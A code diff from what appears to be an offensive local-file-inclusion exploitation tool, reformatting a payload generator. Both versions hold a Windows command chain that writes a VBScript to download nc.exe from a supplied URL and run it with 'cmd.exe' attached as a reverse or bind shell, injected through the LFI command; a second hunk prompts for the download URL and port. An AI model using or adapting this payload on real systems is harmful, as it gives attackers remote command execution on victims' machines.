@@ -182,35 +182,32 @@ class Payload(object):
 
 	def payload(self):
 		nc=('nc.exe %s') %(self._ip) if self._shell=='reverse' else 'nc.exe -lvvp'
-		payload =('''
-echo strFileURL = "{0}" > down.vbs&
-echo strHDLocation = "nc.exe" >> down.vbs&
-echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> down.vbs&
-echo objXMLHTTP.open "GET", strFileURL, false >> down.vbs&
-echo objXMLHTTP.send() >> down.vbs&
-echo If objXMLHTTP.Status = 200 Then >> down.vbs&
-echo Set objADOStream = CreateObject("ADODB.Stream") >> down.vbs&
-echo objADOStream.Open >> down.vbs&
-echo objADOStream.Type = 1 >> down.vbs&
-echo objADOStream.Write objXMLHTTP.ResponseBody >> down.vbs&
-echo objADOStream.Position = 0 >> down.vbs&
-echo Set objFSO = Createobject("Scripting.FileSystemObject") >> down.vbs&
-echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> down.vbs&
-echo Set objFSO = Nothing >> down.vbs&
-echo objADOStream.SaveToFile strHDLocation >> down.vbs&
-echo objADOStream.Close >> down.vbs&
-echo Set objADOStream = Nothing >> down.vbs&
-echo End if >> down.vbs&
-echo Set objXMLHTTP = Nothing >> down.vbs&
-echo Set objShell=CreateObject("WScript.Shell") >> down.vbs&
-echo objShell.Run "{1} {2} -e ""cmd.exe"" ", 0, true >> down.vbs&
-call down.vbs
-''').format(
-self._url, 
-#self._location, 
-nc, 
-self._port
-)
+		payload =("echo strFileURL = \"{0}\" > down.vbs& \
+			echo strHDLocation = \"nc.exe\" >> down.vbs& \
+			echo Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> down.vbs& \
+			echo objXMLHTTP.open \"GET\", strFileURL, false >> down.vbs& \
+			echo objXMLHTTP.send() >> down.vbs& \
+			echo If objXMLHTTP.Status = 200 Then >> down.vbs& \
+			echo Set objADOStream = CreateObject(\"ADODB.Stream\") >> down.vbs& \
+			echo objADOStream.Open >> down.vbs& echo objADOStream.Type = 1 >> down.vbs& \
+			echo objADOStream.Write objXMLHTTP.ResponseBody >> down.vbs& \
+			echo objADOStream.Position = 0 >> down.vbs& \
+			echo Set objFSO = Createobject(\"Scripting.FileSystemObject\") >> down.vbs& \
+			echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> down.vbs& \
+			echo Set objFSO = Nothing >> down.vbs& \
+			echo objADOStream.SaveToFile strHDLocation >> down.vbs& \
+			echo objADOStream.Close >> down.vbs& \
+			echo Set objADOStream = Nothing >> down.vbs& \
+			echo End if >> down.vbs& \
+			echo Set objXMLHTTP = Nothing >> down.vbs& \
+			echo Set objShell=CreateObject(\"WScript.Shell\") >> down.vbs& \
+			echo objShell.Run \"{1} {2} -e \"\"cmd.exe\"\" \", 0, true >> down.vbs& \
+			call down.vbs").format(
+			self._url, 
+			#self._location, 
+			nc, 
+			self._port
+			)
 
 		return payload
 
@@ -227,6 +224,7 @@ def shells(method, shell):
 		if choice == 1 and shell == 'bind':
 			shellObj.url = str(input("[*] Enter the download URL of netcat: "))
 			shellObj.port = str(input("[*] Enter the port to bind: "))
+			print('[+] Connect on %s port %s') %(shellObj.ip, shellObj.port)
 			payload = shellObj.payload()
 			lfiObj.command = payload
 			
